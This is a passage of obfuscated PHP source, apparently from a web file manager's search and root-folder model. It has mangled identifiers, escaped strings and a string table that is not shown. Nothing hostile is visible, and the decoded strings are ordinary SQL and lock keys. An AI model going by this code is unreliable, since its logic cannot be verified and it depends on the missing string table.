$¶Âà¨èş; } } goto E‘Õ®«ï; aò‚–•­Àî: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($²è®¬åä) { $Ù¶–â¨ =& $_SERVER[Îûáû“ş]; $Ìİ“£® = KodIO::fileTypeList(); $«è—÷ºË = $Ìİ“£®[$²è®¬åä]; if (!$«è—÷ºË) { return array(); } $¶é·—Çˆ = $«è—÷ºË[$Ù¶–â¨[174]]; $Óæ†©ñò = $Ù¶–â¨[7]; if (!$«è—÷ºË[$Ù¶–â¨[174]]) { $ß¦¿‹Îó = array_to_keyvalue($Ìİ“£®, $Ù¶–â¨[12], $Ù¶–â¨[174]); $¶é·—Çˆ = implode($Ù¶–â¨[50], $ß¦¿‹Îó); $Óæ†©ñò = $Ù¶–â¨[2116]; } $šÁÆíÌ¯ = explode($Ù¶–â¨[50], trim($¶é·—Çˆ, $Ù¶–â¨[50])); return array($Óæ†©ñò, $šÁÆíÌ¯); } public function listPathType($î‚İÁØ) { $â¬Ÿ¨éó =& $_SERVER[Îûáû“ş]; $î¶âÓ÷û = $this->fileTypeWhere($î‚İÁØ); if (!$î¶âÓ÷û) { return array(); } $Ùéµ±Ö¨ = USER_ID; $îŠÍÁ Ş = Model($â¬Ÿ¨éó[525])->getInfo($Ùéµ±Ö¨); $¥í¼üßâ = array($â¬Ÿ¨éó[576] => SourceModel::TYPE_USER, $â¬Ÿ¨éó[511] => array($â¬Ÿ¨éó[540], $â¬Ÿ¨éó[521] . $îŠÍÁ Ş[$â¬Ÿ¨éó[87]][$â¬Ÿ¨éó[402]] . $â¬Ÿ¨éó[541]), $â¬Ÿ¨éó[577] => $Ùéµ±Ö¨, $â¬Ÿ¨éó[574] => 0, $â¬Ÿ¨éó[575] => $î¶âÓ÷û); return $this->listSource($¥í¼üßâ); } public function listSearch($«šéÒ¶, $‘Î”¯„º = 300) { $¼·ÃÑôä =& $_SERVER[Îûáû“ş]; if (isset($«šéÒ¶[$¼·ÃÑôä[1955]]) && $«šéÒ¶[$¼·ÃÑôä[1955]]) { $«šéÒ¶[$¼·ÃÑôä[1955]] = str_replace($¼·ÃÑôä[384], $¼·ÃÑôä[2117], trim($«šéÒ¶[$¼·ÃÑôä[1955]])); } $¹ÏÊ«Ò = $this->_parseSearchWhere($«šéÒ¶); if (!isset($¹ÏÊ«Ò[$¼·ÃÑôä[431]])) { $¹ÏÊ«Ò[$¼·ÃÑôä[431]] = 0; } $í‰¥Å§Ê = $¼·ÃÑôä[2118]; $ø§‚İĞğ = $¹ÏÊ«Ò; $˜¯ÛÉÔå = $í‰¥Å§Ê; $this->_listSearchBindPinyin($«šéÒ¶, $¹ÏÊ«Ò, $í‰¥Å§Ê); $this->alias($¼·ÃÑôä[446])->_makeOrder(); $¹ÏÊ«Ò = $this->parseWhereLike($¹ÏÊ«Ò); $”ÌÁû£« = $this->distinct(!0)->field($í‰¥Å§Ê)->where($¹ÏÊ«Ò)->selectPage($‘Î”¯„º); if ($GLOBALS[$¼·ÃÑôä[6]][$¼·ÃÑôä[381]][$¼·ÃÑôä[382]] && Input::check($«šéÒ¶[$¼·ÃÑôä[1955]], $¼·ÃÑôä[583]) && $”ÌÁû£«[$¼·ÃÑôä[366]][$¼·ÃÑôä[353]] == 1 && $”ÌÁû£«[$¼·ÃÑôä[366]][$¼·ÃÑôä[367]] == 0) { $”ÌÁû£« = $this->distinct(!0)->field($í‰¥Å§Ê)->where($ø§‚İĞğ)->limit(1000)->select(); $”ÌÁû£« = array_page_split($”ÌÁû£«, !1, $‘Î”¯„º); } $this->_listSearchFileContent($”ÌÁû£«, $«šéÒ¶, $˜¯ÛÉÔå, $ø§‚İĞğ); $this->_listSearchDesc($”ÌÁû£«, $«šéÒ¶, $˜¯ÛÉÔå); $this->_listSearchTag($”ÌÁû£«, $«šéÒ¶, $˜¯ÛÉÔå); $this->_listSearchGroupTag($”ÌÁû£«, $«šéÒ¶, $˜¯ÛÉÔå); $this->_listDataApply($”ÌÁû£«[$¼·ÃÑôä[369]]); $this->_listMake($”ÌÁû£«); return $”ÌÁû£«; } private function _listSearchFileContent(&$é…õ€, $ş»ªÜ¦, $ûÉæıĞ, $®÷Æ‘Ëò) { $Ï‰éÚ®Î =& $_SERVER[Îûáû“ş]; if (!$ş»ªÜ¦[$Ï‰éÚ®Î[1955]] || $é…õ€[$Ï‰éÚ®Î[366]][$Ï‰éÚ®Î[353]] > 1) { return; } if (!isset($®÷Æ‘Ëò[$Ï‰éÚ®Î[32]]) || !is_array($ş»ªÜ¦[$Ï‰éÚ®Î[468]])) { return; } $®÷Æ‘Ëò[$Ï‰éÚ®Î[468]] = array($Ï‰éÚ®Î[7], $ş»ªÜ¦[$Ï‰éÚ®Î[468]]); unset($®÷Æ‘Ëò[$Ï‰éÚ®Î[32]]); unset($ş»ªÜ¦[$Ï‰éÚ®Î[468]]); $ú¨¿ã´Ş = $this->field($ûÉæıĞ)->where($®÷Æ‘Ëò)->limit($Ï‰éÚ®Î[2119])->select(); if (!$ú¨¿ã´Ş || count($ú¨¿ã´Ş) == 0) { return; } $é…õ€[$Ï‰éÚ®Î[369]] = array_merge($ú¨¿ã´Ş, $é…õ€[$Ï‰éÚ®Î[369]]); $é…õ€[$Ï‰éÚ®Î[366]][$Ï‰éÚ®Î[367]] += count($ú¨¿ã´Ş); } private function _listSearchTag(&$áìÙŒˆ, $ñ˜ ¦ªõ, $ø°˜íÒĞ) { $‚œÄ¸×ª =& $_SERVER[Îûáû“ş]; if (!$ñ˜ ¦ªõ[$‚œÄ¸×ª[1955]] || $áìÙŒˆ[$‚œÄ¸×ª[366]][$‚œÄ¸×ª[353]] > 1) { return; } $§õ«—ÓŞ = Model($‚œÄ¸×ª[2120])->listData(); $Šş´Û°¨ = array(); $¦ÂñòŒ = $ñ˜ ¦ªõ[$‚œÄ¸×ª[1955]]; foreach ($§õ«—ÓŞ as $”ÌÒ ›‡) { $¤œÊıÚ = $”ÌÒ ›‡[$‚œÄ¸×ª[32]]; $Øƒˆ÷÷Ï = str_replace($‚œÄ¸×ª[53], $‚œÄ¸×ª[12], Pinyin::get($¤œÊıÚ)); if (stripos($¤œÊıÚ, $¦ÂñòŒ) !== !1 || stripos($Øƒˆ÷÷Ï, $¦ÂñòŒ) !== !1) { $Šş´Û°¨[] = $”ÌÒ ›‡[$‚œÄ¸×ª[399]]; } } if (!$Šş´Û°¨) { return; } $¡¯ò¹ö = array($‚œÄ¸×ª[426] => array($‚œÄ¸×ª[7], $Šş´Û°¨), $‚œÄ¸×ª[1670] => USER_ID); $Ó§û‡’ê = Model($‚œÄ¸×ª[428])->field($‚œÄ¸×ª[84])->where($¡¯ò¹ö)->select(); $Ó§û‡’ê = array_to_keyvalue($Ó§û‡’ê, $‚œÄ¸×ª[12], $‚œÄ¸×ª[84]); $œúÅ—¨ = array_unique($Ó§û‡’ê); $this->_listSearchMerge($áìÙŒˆ, $ñ˜ ¦ªõ, $ø°˜íÒĞ, $œúÅ—¨); } private function _listSearchDesc(&$¯ãİÅÀ, $Úí˜íÏı, $ê˜ÚÉØÑ) { $‚”„æÑÓ =& $_SERVER[Îûáû“ş]; if (!$Úí˜íÏı[$‚”„æÑÓ[1955]] || $¯ãİÅÀ[$‚”„æÑÓ[366]][$‚”„æÑÓ[353]] > 1) { return; } $¸¤°á = array($‚”„æÑÓ[94] => $‚”„æÑÓ[453], $‚”„æÑÓ[374] => array($‚”„æÑÓ[383], $‚”„æÑÓ[1957] . $Úí˜íÏı[$‚”„æÑÓ[1955]] . $‚”„æÑÓ[1957])); $åóûÛÊ‰ = !1; if ($åóûÛÊ‰) { $•Ú¼µÀõ = $this->listSearchChildren($Úí˜íÏı[$‚”„æÑÓ[432]]); $•Ú¼µÀõ = array_unique($•Ú¼µÀõ); if (!$•Ú¼µÀõ) { return; } $¸¤°á[$‚”„æÑÓ[402]] = array($‚”„æÑÓ[7], $•Ú¼µÀõ); } $µúîÄåË = Model($‚”„æÑÓ[560])->field($‚”„æÑÓ[402])->where($¸¤°á)->limit(5000)->select(); $ù‹£ï®… = array_to_keyvalue($µúîÄåË, $‚”„æÑÓ[12], $‚”„æÑÓ[402]); $this->_listSearchMerge($¯ãİÅÀ, $Úí˜íÏı, $ê˜ÚÉØÑ, $ù‹£ï®…); } private function _listSearchGroupTag(&$€·¬°™ , $ÅãĞùÌÉ, $œÎÂˆ‰‹) { $³Âê÷š¡ =& $_SERVER[Îûáû“ş]; if (!$ÅãĞùÌÉ[$³Âê÷š¡[1955]] || $€·¬°™ [$³Âê÷š¡[366]][$³Âê÷š¡[353]] > 1 || !$ÅãĞùÌÉ[$³Âê÷š¡[432]]) { return; } $Àİ¼ êâ = $this->sourceInfo($ÅãĞùÌÉ[$³Âê÷š¡[432]]); if (!$Àİ¼ êâ || $Àİ¼ êâ[$³Âê÷š¡[411]] != SourceModel::TYPE_GROUP) { return; } $…ªÉóı® = $Àİ¼ êâ[$³Âê÷š¡[496]]; $¹öÚÄƒò = Model($³Âê÷š¡[2121])->get($…ªÉóı®); $°ÄÊ©­Ö = array(); $§îËªÙ§ = $ÅãĞùÌÉ[$³Âê÷š¡[1955]]; foreach ($¹öÚÄƒò[$³Âê÷š¡[369]] as $ÑÜÏ×è€) { $Ûú´ÄÑª = $ÑÜÏ×è€[$³Âê÷š¡[32]]; $«¨ğ¯Î = str_replace($³Âê÷š¡[53], $³Âê÷š¡[12], Pinyin::get($Ûú´ÄÑª)); if (stripos($Ûú´ÄÑª, $§îËªÙ§) !== !1 || stripos($«¨ğ¯Î, $§îËªÙ§) !== !1) { $°ÄÊ©­Ö[] = $ÑÜÏ×è€[$³Âê÷š¡[399]]; } } if (!$°ÄÊ©­Ö) { return; } $‹ÏÎ›Á = array($³Âê÷š¡[426] => array($³Âê÷š¡[7], $°ÄÊ©­Ö), $³Âê÷š¡[1670] => 0, $³Âê÷š¡[33] => $³Âê÷š¡[1977] . $…ªÉóı®); $¶Šîè·û = Model($³Âê÷š¡[428])->field($³Âê÷š¡[84])->where($‹ÏÎ›Á)->select(); $¶Šîè·û = array_to_keyvalue($¶Šîè·û, $³Âê÷š¡[12], $³Âê÷š¡[84]); $æ…©¹Æ = array_unique($¶Šîè·û); $this->_listSearchMerge($€·¬°™ , $ÅãĞùÌÉ, $œÎÂˆ‰‹, $æ…©¹Æ); } private function _listSearchMerge(&$¨¿ô°¼¼, $àÒúÖ©, $Ó–Â•–î, $ŒšÔ¨ù„) { $œ»Êí„¯ =& $_SERVER[Îûáû“ş]; if (!$ŒšÔ¨ù„) { return; } $•¶¡âÉ€ = array_to_keyvalue($¨¿ô°¼¼[$œ»Êí„¯[369]], $œ»Êí„¯[12], $œ»Êí„¯[402]); $³ˆÏƒïõ = array_diff($ŒšÔ¨ù„, $•¶¡âÉ€); if (!$³ˆÏƒïõ) { return; } $–Ÿ‰Ç = array($œ»Êí„¯[402] => array($œ»Êí„¯[7], $³ˆÏƒïõ)); $Ù¿üÇÀË = $this->field($Ó–Â•–î)->where($–Ÿ‰Ç)->select(); if (!$Ù¿üÇÀË) { return; } $çúŠ« = array(); foreach ($Ù¿üÇÀË as $ÚÄ¸ŒÕØ) { if ($this->_listSearchFilter($ÚÄ¸ŒÕØ, $àÒúÖ©)) { $çúŠ«[] = $ÚÄ¸ŒÕØ; } } $¨¿ô°¼¼[$œ»Êí„¯[369]] = array_merge($çúŠ«, $¨¿ô°¼¼[$œ»Êí„¯[369]]); $¨¿ô°¼¼[$œ»Êí„¯[366]][$œ»Êí„¯[367]] += count($çúŠ«); } private function _listSearchFilter($…çÒí‰ë, $·¦ÙíÅú) { $â»Äî–Æ =& $_SERVER[Îûáû“ş]; $¤´óİô¯ = $…çÒí‰ë[$â»Äî–Æ[410]] == $â»Äî–Æ[88]; if (!strstr($…çÒí‰ë[$â»Äî–Æ[511]], $â»Äî–Æ[50] . $·¦ÙíÅú[$â»Äî–Æ[432]] . $â»Äî–Æ[50])) { return !1; } if (isset($·¦ÙíÅú[$â»Äî–Æ[412]]) && $·¦ÙíÅú[$â»Äî–Æ[412]] != $â»Äî–Æ[1916]) { if ($·¦ÙíÅú[$â»Äî–Æ[412]] == $â»Äî–Æ[75] && !$¤´óİô¯) { return !1; } if ($·¦ÙíÅú[$â»Äî–Æ[412]] != $â»Äî–Æ[75] && $¤´óİô¯) { return !1; } if (!strstr($…çÒí‰ë[$â»Äî–Æ[174]], $â»Äî–Æ[50] . $·¦ÙíÅú[$â»Äî–Æ[412]] . $â»Äî–Æ[50])) { return !1; } } if (isset($·¦ÙíÅú[$â»Äî–Æ[2122]]) && $·¦ÙíÅú[$â»Äî–Æ[2122]] < $…çÒí‰ë[$â»Äî–Æ[76]]) { return !1; } if (isset($·¦ÙíÅú[$â»Äî–Æ[2123]]) && $·¦ÙíÅú[$â»Äî–Æ[2123]] > $…çÒí‰ë[$â»Äî–Æ[76]]) { return !1; } if (isset($·¦ÙíÅú[$â»Äî–Æ[590]]) && $·¦ÙíÅú[$â»Äî–Æ[590]] != $…çÒí‰ë[$â»Äî–Æ[456]]) { return !1; } return !0; } public function listSearchChildren($ŒÊ¹Ğ¦², $–ô®©·Ô = 5000) { $Áİ„¥É£ =& $_SERVER[Îûáû“ş]; $ŒºÙñ = array(); $™ñ¦‡•Ì = $this->sourceInfo($ŒÊ¹Ğ¦²); $ìı´š‚¶ = array($Áİ„¥É£[511] => array($Áİ„¥É£[383], $™ñ¦‡•Ì[$Áİ„¥É£[511]] . $™ñ¦‡•Ì[$Áİ„¥É£[402]] . $Áİ„¥É£[541])); $õ­Å‡ÉØ = $this->field($Áİ„¥É£[76])->where($ìı´š‚¶)->limit($–ô®©·Ô + 1)->select(); $ÕØù¾æ = is_array($õ­Å‡ÉØ) ? count($õ­Å‡ÉØ) : 0; if ($ÕØù¾æ > $–ô®©·Ô) { return $this->_listSearchChildrenNear($ŒÊ¹Ğ¦², $–ô®©·Ô); } $ƒ˜™Ô­ = $this->field($Áİ„¥É£[402])->where($ìı´š‚¶)->select(); $ŒºÙñ = array_to_keyvalue($ƒ˜™Ô­, $Áİ„¥É£[12], $Áİ„¥É£[402]); return $ŒºÙñ; } private function _listSearchChildrenNear($ÉŠä¡‡û, $Âµ÷†Èô) { $Ò¥òìÒ‰ =& $_SERVER[Îûáû“ş]; $íÌå¤” = array(); $Êš˜ñÅÒ = array($Ò¥òìÒ‰[432] => $ÉŠä¡‡û); $¸¥×³Ç­ = $this->field($Ò¥òìÒ‰[2124])->where($Êš˜ñÅÒ)->select(); $Ö–Å‡Ÿ = array_to_keyvalue(array_filter_by_field($¸¥×³Ç­, $Ò¥òìÒ‰[410], $Ò¥òìÒ‰[88]), $Ò¥òìÒ‰[12], $Ò¥òìÒ‰[402]); $íÌå¤” = array_merge($íÌå¤”, array_to_keyvalue($¸¥×³Ç­, $Ò¥òìÒ‰[12], $Ò¥òìÒ‰[402])); if (!$Ö–Å‡Ÿ) { return $íÌå¤”; } $Êš˜ñÅÒ = array($Ò¥òìÒ‰[432] => array($Ò¥òìÒ‰[7], $Ö–Å‡Ÿ)); $¸¥×³Ç­ = $this->field($Ò¥òìÒ‰[2124])->where($Êš˜ñÅÒ)->limit($Âµ÷†Èô)->select(); $íÌå¤” = array_merge($íÌå¤”, array_to_keyvalue($¸¥×³Ç­, $Ò¥òìÒ‰[12], $Ò¥òìÒ‰[402])); $íÌå¤” = array_slice($íÌå¤”, 0, $Âµ÷†Èô); return $íÌå¤”; } private function _listSearchBindPinyin($ò¶±£Ÿ§, &$Ù–®üà, &$±³ò«ó‘) { $¤Ñ—ºÏè =& $_SERVER[Îûáû“ş]; if (!isset($ò¶±£Ÿ§[$¤Ñ—ºÏè[1955]]) || !$ò¶±£Ÿ§[$¤Ñ—ºÏè[1955]]) { return; } if (!Input::check($ò¶±£Ÿ§[$¤Ñ—ºÏè[1955]], $¤Ñ—ºÏè[318]) || strlen($ò¶±£Ÿ§[$¤Ñ—ºÏè[1955]]) < 2) { return; } $ÂİÜêì‘ = "\x4c\x45\106\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\151\x6f\137\x73\x6f\x75\x72\143\x65\137\155\x65\164\141\40\155\145\x74\x61\x20\157\156\x20\163\x6f\x75\x72\x63\x65\x2e\163\x6f\x75\162\143\x65\111\x44\40\75\x20\155\x65\164\141\x2e\x73\x6f\165\162\x63\x65\x49\x44"; $›çÎ‰€± = array(); $±³ò«ó‘ = str_replace(array($¤Ñ—ºÏè[231], $¤Ñ—ºÏè[53], $¤Ñ—ºÏè[2125]), $¤Ñ—ºÏè[12], $±³ò«ó‘); $±³ò«ó‘ = $¤Ñ—ºÏè[438] . str_replace($¤Ñ—ºÏè[50], $¤Ñ—ºÏè[439], $±³ò«ó‘); $±âì–ÄÇ = $Ù–®üà[$¤Ñ—ºÏè[32]]; unset($Ù–®üà[$¤Ñ—ºÏè[32]]); foreach ($Ù–®üà as $ğÛÖ»²ó => $¢¼ç×°ş) { $›çÎ‰€±[$¤Ñ—ºÏè[438] . $ğÛÖ»²ó] = $¢¼ç×°ş; } foreach ($±âì–ÄÇ as $ÆíÃ§Â÷) { $›çÎ‰€±[] = array($¤Ñ—ºÏè[443] => $ÆíÃ§Â÷, $¤Ñ—ºÏè[1002] => $¤Ñ—ºÏè[1959], array($¤Ñ—ºÏè[2126] => $ÆíÃ§Â÷, $¤Ñ—ºÏè[2127] => array($¤Ñ—ºÏè[7], array($¤Ñ—ºÏè[465], $¤Ñ—ºÏè[464])))); } $this->join($ÂİÜêì‘); $Ù–®üà = $›çÎ‰€±; } private function _parseSearchWhere($Î€û¹—) { $æóøÓ‹È =& $_SERVER[Îûáû“ş]; $º¨çÖ“Ÿ = array(); if (isset($Î€û¹—[$æóøÓ‹È[759]]) && $Î€û¹—[$æóøÓ‹È[759]]) { $º¨çÖ“Ÿ[$æóøÓ‹È[85]] = array($æóøÓ‹È[2128], $Î€û¹—[$æóøÓ‹È[759]]); } if (isset($Î€û¹—[$æóøÓ‹È[760]]) && $Î€û¹—[$æóøÓ‹È[760]]) { $ÀÓÜ²‚ü = array($æóøÓ‹È[2129], $Î€û¹—[$æóøÓ‹È[760]]); if ($º¨çÖ“Ÿ[$æóøÓ‹È[85]]) { $º¨çÖ“Ÿ[$æóøÓ‹È[85]] = array($º¨çÖ“Ÿ[$æóøÓ‹È[85]], $ÀÓÜ²‚ü, $æóøÓ‹È[2130]); } else { $º¨çÖ“Ÿ[$æóøÓ‹È[85]] = $ÀÓÜ²‚ü; } } if (isset($Î€û¹—[$æóøÓ‹È[2122]]) && $Î€û¹—[$æóøÓ‹È[2122]] > 0) { $º¨çÖ“Ÿ[$æóøÓ‹È[76]] = array($æóøÓ‹È[2128], $Î€û¹—[$æóøÓ‹È[2122]]); } if (isset($Î€û¹—[$æóøÓ‹È[2123]]) && $Î€û¹—[$æóøÓ‹È[2123]]) { $ÀÓÜ²‚ü = array($æóøÓ‹È[2129], $Î€û¹—[$æóøÓ‹È[2123]]); if ($º¨çÖ“Ÿ[$æóøÓ‹È[76]]) { $º¨çÖ“Ÿ[$æóøÓ‹È[76]] = array($º¨çÖ“Ÿ[$æóøÓ‹È[76]], $ÀÓÜ²‚ü, $æóøÓ‹È[2130]); } else { $º¨çÖ“Ÿ[$æóøÓ‹È[76]] = $ÀÓÜ²‚ü; } } if (isset($Î€û¹—[$æóøÓ‹È[590]]) && $Î€û¹—[$æóøÓ‹È[590]]) { $º¨çÖ“Ÿ[] = array($æóøÓ‹È[456] => $Î€û¹—[$æóøÓ‹È[590]], $æóøÓ‹È[454] => $Î€û¹—[$æóøÓ‹È[590]], $æóøÓ‹È[1002] => $æóøÓ‹È[1959]); } if (isset($Î€û¹—[$æóøÓ‹È[412]]) && $Î€û¹—[$æóøÓ‹È[412]]) { $‘ö€¿Ò = $Î€û¹—[$æóøÓ‹È[412]]; if ($‘ö€¿Ò == $æóøÓ‹È[75]) { $º¨çÖ“Ÿ[$æóøÓ‹È[410]] = 1; } else { if ($‘ö€¿Ò == $æóøÓ‹È[2131]) { $º¨çÖ“Ÿ[$æóøÓ‹È[410]] = 0; } else { if ($‘ö€¿Ò) { $‘ö€¿Ò = is_array($‘ö€¿Ò) ? $‘ö€¿Ò : explode($æóøÓ‹È[50], $‘ö€¿Ò); $º¨çÖ“Ÿ[$æóøÓ‹È[412]] = array($æóøÓ‹È[418], $‘ö€¿Ò); $º¨çÖ“Ÿ[$æóøÓ‹È[410]] = 0; } } } } $this->_parseSearchParent($Î€û¹—, $º¨çÖ“Ÿ); if (isset($Î€û¹—[$æóøÓ‹È[1955]]) && trim($Î€û¹—[$æóøÓ‹È[1955]])) { $ íÜşî™ = trim($Î€û¹—[$æóøÓ‹È[1955]]); $¨Æğ‰Ï¥ = explode($æóøÓ‹È[53], $ íÜşî™); if (strlen($ íÜşî™) > 2 && (substr($ íÜşî™, 0, 1) == $æóøÓ‹È[118] && substr($ íÜşî™, -1) == $æóøÓ‹È[118]) || substr($ íÜşî™, 0, 1) == $æóøÓ‹È[58] && substr($ íÜşî™, -1) == $æóøÓ‹È[58]) { $ íÜşî™ = substr($ íÜşî™, 1, -1); $¨Æğ‰Ï¥ = array($ íÜşî™); } $º¨çÖ“Ÿ[$æóøÓ‹È[32]] = array(array($æóøÓ‹È[540], $æóøÓ‹È[1957] . $ íÜşî™ . $æóøÓ‹È[1957])); if (count($¨Æğ‰Ï¥) > 1) { $º¨çÖ“Ÿ[$æóøÓ‹È[32]] = array(); foreach ($¨Æğ‰Ï¥ as $•‚•Á’ ) { if (!trim($•‚•Á’ )) { continue; } $º¨çÖ“Ÿ[$æóøÓ‹È[32]][] = array($æóøÓ‹È[540], $æóøÓ‹È[1957] . trim($•‚•Á’ ) . $æóøÓ‹È[1957]); } } } return $º¨çÖ“Ÿ; } private function _parseSearchParent($©’˜÷šœ, &$òîŞĞº) { $¡ËÊ¹Şè =& $_SERVER[Îûáû“ş]; if (!isset($©’˜÷šœ[$¡ËÊ¹Şè[432]]) || !$©’˜÷šœ[$¡ËÊ¹Şè[432]]) { return; } $¿Äì·Õ° = $this->pathInfo($©’˜÷šœ[$¡ËÊ¹Şè[432]]); $ú‰ûµ…Ë = $¿Äì·Õ°[$¡ËÊ¹Şè[432]] . $¡ËÊ¹Şè[12] === $¡ËÊ¹Şè[198]; $¾ğ‘ = $¿Äì·Õ°[$¡ËÊ¹Şè[411]] == $¡ËÊ¹Şè[505]; if ($¿Äì·Õ°[$¡ËÊ¹Şè[522]] == $¡ËÊ¹Şè[523]) { $åÛ³ë·½ = $this->sourceInfo($©’˜÷šœ[$¡ËÊ¹Şè[432]]); $¿Äì·Õ°[$¡ËÊ¹Şè[511]] = $åÛ³ë·½[$¡ËÊ¹Şè[511]]; } $òîŞĞº[$¡ËÊ¹Şè[580]] = array($¡ËÊ¹Şè[540], $¿Äì·Õ°[$¡ËÊ¹Şè[511]] . $©’˜÷šœ[$¡ËÊ¹Şè[432]] . $¡ËÊ¹Şè[541]); $ŒÏ¸†ìÉ = isset($©’˜÷šœ[$¡ËÊ¹Şè[1820]]) && in_array($¡ËÊ¹Şè[505], $©’˜÷šœ[$¡ËÊ¹Şè[1820]]); if (!$ŒÏ¸†ìÉ || !$¾ğ‘ || !$ú‰ûµ…Ë || !$¿Äì·Õ°[$¡ËÊ¹Şè[413]]) { return; } if (!AuthModel::authCheckRoot($¿Äì·Õ°[$¡ËÊ¹Şè[413]][$¡ËÊ¹Şè[414]])) { return; } $íñ «à¿ = $¿Äì·Õ°[$¡ËÊ¹Şè[496]] . $¡ËÊ¹Şè[12]; if ($íñ «à¿ == $¡ËÊ¹Şè[88]) { unset($òîŞĞº[$¡ËÊ¹Şè[580]]); $òîŞĞº[$¡ËÊ¹Şè[411]] = self::TYPE_GROUP; return; } $üÅäÜŸÉ = Model($¡ËÊ¹Şè[512])->groupChildrenAll($íñ «à¿); $îè¾è¬ˆ = count($üÅäÜŸÉ); if ($îè¾è¬ˆ <= 1) { return; } $¶ª°´×Ö = array($¡ËÊ¹Şè[432] => 0, $¡ËÊ¹Şè[411] => self::TYPE_GROUP, $¡ËÊ¹Şè[496] => array($¡ËÊ¹Şè[7], $üÅäÜŸÉ)); $ôŸÊ›óé = $this->field($¡ËÊ¹Şè[2132])->where($¶ª°´×Ö)->limit($îè¾è¬ˆ)->select(); $òîŞĞº[$¡ËÊ¹Şè[580]] = array(); foreach ($ôŸÊ›óé as $ó¼‹¯æ´) { $òîŞĞº[$¡ËÊ¹Şè[580]][] = array($¡ËÊ¹Şè[540], $¡ËÊ¹Şè[521] . $ó¼‹¯æ´[$¡ËÊ¹Şè[402]] . $¡ËÊ¹Şè[541]); } $òîŞĞº[$¡ËÊ¹Şè[580]][] = $¡ËÊ¹Şè[1959]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ç½Ÿ£‘É) { $ƒÜé«è¢ =& $_SERVER[Îûáû“ş]; $¡¨‘”â‰ = Model($ƒÜé«è¢[504])->where(array($ƒÜé«è¢[1661] => $ç½Ÿ£‘É))->find(); $°‰‚şˆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ç½Ÿ£‘É, $¡¨‘”â‰[$ƒÜé«è¢[32]]); $this->userDesktopAdd($°‰‚şˆ); return $°‰‚şˆ; } public function userDesktopAdd($ŞºÄö) { $ê€Şó·Ï =& $_SERVER[Îûáû“ş]; $æ“ÁûÛÆ = LNG($ê€Şó·Ï[2133]); $¡±Ë®Š = $this->mkdir($ŞºÄö, $æ“ÁûÛÆ); $this->metaSet($¡±Ë®Š, $ê€Şó·Ï[2134], $ê€Şó·Ï[88]); $this->metaSet($ŞºÄö, $ê€Şó·Ï[2135], $¡±Ë®Š); } public function userPathSafeAdd($©÷óî×‡) { $ç£ÄêÖ =& $_SERVER[Îûáû“ş]; $â¶ººã˜ = Model($ç£ÄêÖ[504])->getInfoFull($©÷óî×‡); if (!$â¶ººã˜) { return !1; } if (_get($â¶ººã˜, $ç£ÄêÖ[526])) { return $â¶ººã˜[$ç£ÄêÖ[466]][$ç£ÄêÖ[2136]]; } $İàø‰€ó = $this->_mkdirRoot(SourceModel::TYPE_USER, $©÷óî×‡, $ç£ÄêÖ[2137], $ç£ÄêÖ[433]); Model($ç£ÄêÖ[504])->metaSet($©÷óî×‡, $ç£ÄêÖ[2136], $İàø‰€ó); $this->metaSet($İàø‰€ó, $ç£ÄêÖ[2138], $©÷óî×‡); return $İàø‰€ó; } public function groupRootAdd($±Ü½ˆ›¥) { $âŞ‚ÕñÙ =& $_SERVER[Îûáû“ş]; $öæéğšú = Model($âŞ‚ÕñÙ[512])->where(array($âŞ‚ÕñÙ[1949] => $±Ü½ˆ›¥))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $±Ü½ˆ›¥, $öæéğšú[$âŞ‚ÕñÙ[32]]); } public function systemRootPathAdd($‰¦Øòğ) { if ($‰¦Øòğ != $_SERVER[Îûáû“ş][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‰¦Øòğ); } public function userRootRemove($¥‚×¶†) { $¥ı»ùÅù = $this->targetSourceRoot(SourceModel::TYPE_USER, $¥‚×¶†, !0); foreach ($¥ı»ùÅù as $¢©‰ƒî) { if (!$¢©‰ƒî) { continue; } $this->remove($¢©‰ƒî[$_SERVER[Îûáû“ş][402]], !1); } } public function groupRootRemove($©µñÇ) { $‰›ò» = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $©µñÇ); if (!$‰›ò») { return; } $this->remove($‰›ò»[$_SERVER[Îûáû“ş][402]], !1); } private function _mkdirRoot($Ï¥ñ–Åù, $ıéÊ¦¤‘, $Œ¼îåç, $ù€¥œ¢“ = '') { $ñ‡Ì†§‘ =& $_SERVER[Îûáû“ş]; $¡ç“¿ÄĞ = defined($ñ‡Ì†§‘[2139]) ? USER_ID : 0; $Ê–¦­¨ = array($ñ‡Ì†§‘[401] => 0, $ñ‡Ì†§‘[576] => $Ï¥ñ–Åù, $ñ‡Ì†§‘[577] => $ıéÊ¦¤‘, $ñ‡Ì†§‘[574] => 1, $ñ‡Ì†§‘[578] => $¡ç“¿ÄĞ, $ñ‡Ì†§‘[579] => $¡ç“¿ÄĞ, $ñ‡Ì†§‘[575] => $ù€¥œ¢“, $ñ‡Ì†§‘[580] => $ñ‡Ì†§‘[521], $ñ‡Ì†§‘[430] => 0, $ñ‡Ì†§‘[545] => 0, $ñ‡Ì†§‘[469] => 0, $ñ‡Ì†§‘[581] => $ñ‡Ì†§‘[12]); if ($¥è¨Ù” = $this->where($Ê–¦­¨)->find()) { return $¥è¨Ù”[$ñ‡Ì†§‘[402]]; } $¥æÑ¨°Ò = "\115\x6f\144\145\154\x53\157\165\162\143\x65\x2e\155\153\144\x69\x72\122\157\157\164\56{$Ï¥ñ–Åù}\56{$ıéÊ¦¤‘}\56" . $Œ¼îåç; CacheLock::lock($¥æÑ¨°Ò); $Ê–¦­¨[$ñ‡Ì†§‘[32]] = $Œ¼îåç; $ÆÇáñ… = $this->add($Ê–¦­¨); $¿‘…Ê™ = array($ñ‡Ì†§‘[582] => short_id($ÆÇáñ…)); $this->where(array($ñ‡Ì†§‘[417] => $ÆÇáñ…))->save($¿‘…Ê™); CacheLock::unlock($¥æÑ¨°Ò); return $ÆÇáñ…; } private function targetSourceRoot($‡Ô­š°ã, $Ì£éùÍæ, $Í»Àû¸ï = false) { $®ë¢æº³ =& $_SERVER[Îûáû“ş]; $öœÄ§ƒ  = array($®ë¢æº³[401] => 0, $®ë¢æº³[576] => $‡Ô­š°ã, $®ë¢æº³[577] => $Ì£éùÍæ); if ($Í»Àû¸ï) { $ïµ£×¯¨ = $this->where($öœÄ§ƒ )->select(); return 